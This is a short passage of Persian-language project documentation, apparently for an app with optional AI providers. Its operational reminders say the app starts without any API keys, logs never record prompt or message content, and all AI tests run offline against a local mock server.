نشانه‌گذاری نقطه/دونقطه الزامی است.

## یادآوری‌های عملیاتی

- هیچ ارائه‌دهنده‌ای اجباری نیست؛ با نبود همهٔ کلیدها برنامه سالم بالا می‌آید و
  endpointها پاسخ فارسی «هوش مصنوعی تنظیم نشده است.» می‌دهند.
- **لاگ هرگز محتوای پیام یا پرامپت را ثبت نمی‌کند**؛ فقط نام ارائه‌دهنده، مدل، کد وضعیت و زمان.
- تمام تست‌های AI آفلاین‌اند (سرور ساختگی محلی، بدون کلید واقعی).

---
